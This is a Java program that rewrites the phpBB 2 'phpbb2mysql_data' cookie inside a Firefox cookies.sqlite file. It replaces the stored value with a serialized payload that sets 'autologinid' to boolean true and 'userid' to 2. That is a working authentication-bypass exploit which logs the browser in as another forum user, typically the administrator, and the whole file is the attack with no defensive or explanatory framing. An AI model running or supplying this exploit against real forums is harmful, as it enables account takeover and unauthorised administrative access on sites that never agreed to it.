import java.sql.*;

public class CookieEditor {
	public static void main(String[] args){
		Connection connection = null;
		ResultSet phpcookie = null; 
		String oldUserId , newUserId, SQL = "";
		
		try{
			connection = DriverManager.getConnection("jdbc:sqlite:cookies.sqlite");
			Statement statement = connection.createStatement();
			statement.setQueryTimeout(30);
			
			SQL = "SELECT value FROM moz_cookies WHERE name = 'phpbb2mysql_data'";
			phpcookie = statement.executeQuery(SQL);//
			if(phpcookie.next()){ // phpbb cookie is present
				
				oldUserId = phpcookie.getString("value"); // returns the content of the cookie's value attribute 
				statement.executeUpdate("UPDATE moz_cookies SET value = 'a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D' WHERE name = 'phpbb2mysql_data'");
				newUserId = statement.executeQuery(SQL).getString("value");
				
				if(!oldUserId.equals(newUserId)){
					System.out.println("the cookie has been updated");
					System.out.println("old value: " + oldUserId);
					System.out.println("new value: " + newUserId);
				}
				else{
					System.out.println("The Update query was run but the cookie's value was not changed");
					System.out.println("Value: " + oldUserId);
				}
			}
			else{
				// phpbb cookie is not present 
				System.out.println("phpbb cookie not found");
			}
			
			
		}
		catch(SQLException e){
			
			System.err.println(e.getMessage());
			
		}
		
		finally{
			try{
				if(connection != null){
					connection.close();
				}
			}
			catch(SQLException e){
				
				// connection close failed
				System.err.println(e);
			}
		}
	}
}
